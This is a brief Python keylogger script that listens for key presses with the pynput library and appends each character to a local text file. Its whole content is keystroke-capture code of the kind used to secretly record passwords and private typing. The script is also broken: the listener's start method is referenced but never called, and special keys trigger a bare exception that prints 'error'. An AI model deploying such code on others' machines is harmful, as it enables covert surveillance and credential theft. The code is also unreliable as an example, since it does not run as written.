from pynput import keyboard

def keyPressed(key):
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write("Button Pressed: "+char+"\n")
        except:
            print("error")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start
    input()